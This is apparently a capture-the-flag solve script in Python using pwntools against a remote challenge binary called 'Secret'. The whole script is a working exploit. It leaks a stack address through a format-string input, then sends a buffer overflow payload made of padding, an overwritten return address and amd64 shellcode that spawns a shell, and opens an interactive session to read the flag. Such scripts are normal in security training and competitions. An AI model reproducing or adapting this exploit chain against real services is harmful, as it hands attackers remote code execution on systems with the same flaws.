import struct
import socket
from pwn import *

#r = process('./Secret')
r = remote('140.113.207.240',8836)
r.recvuntil('Wanna get my secret? Come and get it with your payload <3')
r.sendline("%p,%p,%p")
s = ''
while ',' not in s:
    s = r.recv(1024).decode()

start_buf = int(s.split(',')[1], 16) - 9
# print("leaked start of buffer: 0x{:08x}".format(start_buf))

padding = "dsuhagf ujkagsefjkygvasbjyfgvebaysufgvbeuaysbfvgajsyvbgjasyvbgfjkaysegvbfyjavbgfeyabvfgjyabvfyjagbvfyavbkjfeygvbaekjfygbvayesjgvbkajefvygbaejkyfgbaesyjbxreayksfugaskhjfedukasjfheasgv,ekirfaklsfgskaeifygdahs,fkjeuaskl.ejgfsajhfetgvasbkjfghevbafyutdlsfaekifgbsajkdua"
# padding to reach return address
# len(padding) = 264
# RIP = struct.pack("Q", (start_buf+len(padding)+8))
RIP = p64(start_buf+len(padding)+8) # start point + padding + RIP -> shellcode

context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
payload = b'\x20'*len(padding) + RIP + shellcode
          # padding + return address + shellcode
r.sendline(payload)
r.interactive()
# cat flag

